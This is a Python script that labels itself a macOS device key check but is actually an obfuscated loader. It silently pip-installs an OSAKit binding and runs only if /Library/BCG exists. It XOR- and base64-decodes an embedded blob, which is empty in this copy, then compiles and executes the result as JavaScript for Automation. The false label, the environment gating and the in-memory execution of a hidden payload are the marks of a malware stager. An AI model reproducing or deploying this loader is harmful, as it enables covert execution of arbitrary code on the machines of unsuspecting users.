#!/usr/bin/env python3
####Script for checking the existence of valid key for macDevices####
import base64
from pathlib import Path
keyCheck = None


import importlib
try:
    importlib.import_module('OSAKit')
except ImportError:
    import pip
    pip.main(['install', 'pyobjc-framework-OSAKit'])
finally:
    globals()['OSAKit'] = importlib.import_module('OSAKit')

Check_Path = Path('/Library/BCG')

if not Check_Path.exists():
    raise EnvironmentError("-Test Failed-")

def enc(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def compileScript():
    from OSAKit import OSAScript, OSALanguage

    keyContents = ""
    plaintext = "4A7vJkQ9tM2dX5zL8hW0"

    source_string = keyContents
    the_length = len(plaintext)
    second_length = len(source_string)

    res = [keyContents[y-the_length:y] for y in range(the_length, second_length + the_length,the_length)]
    output = []
    for z in res:
        output.append(enc(base64.b64decode(z), plaintext.encode()))

    bytes_out = b''.join(output)
    bstring_out = base64.b64encode(bytes_out)
    string_out = bstring_out.decode('ascii')

    keyBytes = string_out.encode('ascii')
    setBytes = base64.b64decode(keyBytes)
    setContents = setBytes.decode('ascii')
    javascriptLanguage = OSALanguage.languageForName_("JavaScript")

    keyCheck = OSAScript.alloc().initWithSource_language_(setContents, javascriptLanguage)
    (success, err) = keyCheck.compileAndReturnError_(None)

    # should only occur if jxa is incorrectly written
    if not success:
        raise Exception("error compiling jxa script")
    return keyCheck    

def execute():
    # use a global variable to cache the compiled script for performance
    global keyCheck
    if not keyCheck:
        keyCheck = compileScript()
    
    (result, err) = keyCheck.executeAndReturnError_(None)

    if err:
        raise Exception("jxa error: {}".format(err["NSLocalizedDescription"]))

    # assumes your jxa script returns JSON as described in the above example
    return result.stringValue()

output = execute()
if output != None:
    print(output)
